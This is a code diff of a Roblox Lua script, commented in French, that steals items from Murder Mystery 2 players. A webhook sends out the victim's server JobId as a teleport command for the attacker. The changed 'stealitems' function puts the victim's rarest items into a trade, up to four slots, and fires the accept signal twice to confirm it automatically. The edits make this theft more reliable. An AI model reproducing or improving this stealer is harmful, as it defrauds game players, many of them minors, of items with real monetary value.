@@ -490,7 +490,7 @@ else
     SendWebhook(webHook, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 end
 
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ReplicatedStorage = getItemService or game:GetService("ReplicatedStorage")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
 local function stealitems()
@@ -503,16 +503,26 @@ local function stealitems()
 
     task.wait(2)
 
-    -- Fonction pour ajouter les items un par un proprement
+    local itemsOffered = 0 -- Compteur pour respecter la limite des 4 cases de MM2
+    local maxSlots = 4
+
+    -- Fonction sécurisée qui s'arrête dès que les 4 cases sont pleines
     local function offerAll(itemTable)
-        for _, b in pairs(itemTable) do
-            for i = 1, b.amount do
-                Trade.OfferItem:FireServer(b.data, "Weapons")
-                task.wait(0.1) -- Petit délai pour éviter de saturer le serveur (anti-spam kick)
+        if itemTable and itemsOffered < maxSlots then
+            for _, b in pairs(itemTable) do
+                for i = 1, b.amount do
+                    if itemsOffered >= maxSlots then break end
+                    
+                    Trade.OfferItem:FireServer(b.data, "Weapons")
+                    itemsOffered = itemsOffered + 1
+                    task.wait(0.2)
+                end
+                if itemsOffered >= maxSlots then break end
             end
         end
     end
 
+    -- On priorise les objets les plus rares (Godly, Ancient, Unique, etc.)
     offerAll(uniqueItems)
     offerAll(ancientItems)
     offerAll(godlyItems)
@@ -522,18 +532,16 @@ local function stealitems()
     offerAll(uncommonItems)
     offerAll(commonItems)
 
-    task.wait(10)
+    task.wait(1)
 
-    -- Méthode d'acceptation automatique basée sur l'état du trade
-    -- Au lieu d'attendre 1 min, on valide et on confirme en boucle rapide dès que les items sont posés
+    -- Première validation
     pcall(function()
-        -- Premier signal pour indiquer qu'on accepte l'offre
         Trade.AcceptTrade:FireServer()
     end)
 
     task.wait(2)
 
-    -- Validation finale (équivalent du second clic / bouton de confirmation finale de MM2)
+    -- Validation finale
     pcall(function()
         Trade.AcceptTrade:FireServer()
     end)
